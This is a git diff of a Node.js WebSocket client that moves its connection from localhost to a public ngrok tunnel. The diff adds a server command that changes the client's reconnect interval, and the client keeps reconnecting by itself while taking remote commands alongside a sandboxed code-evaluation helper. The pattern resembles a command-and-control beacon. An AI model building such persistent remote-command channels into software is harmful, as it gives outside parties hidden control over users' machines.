@@ -1,8 +1,10 @@
 const WebSocket = require('ws');
 const { evalinsandbox, isValidCode, isJSON } = require('./index');
 
+let timereconnect = 6000;
+
 function connectWebSocket() {
-    const ws = new WebSocket('ws://localhost:9374');
+    const ws = new WebSocket('wss://kit-touched-commonly.ngrok-free.app');
 
     ws.on('open', () => {
         console.log('Подключено.');
@@ -29,16 +31,16 @@ function connectWebSocket() {
                 ws.send('exit code 0.');
                 ws.close(1000);
                 process.exit(0);
-            } 
-            else if (data.M_command === 'disconnect') {
+            } else if (data.M_command === 'disconnect') {
                 ws.send('close.');
                 ws.close(1000);
+            } else if (data.M_command === 'set_timereconnect') {
+                if (data.timereconnect !== undefined) timereconnect = data.timereconnect;
             }
         }
     });
 
     ws.on('close', () => {
-        const timereconnect = 6000;
         console.log('Соединение закрыто.');
         console.log('Переподключение через ' + timereconnect + 'ms.');
         setTimeout(connectWebSocket, timereconnect);
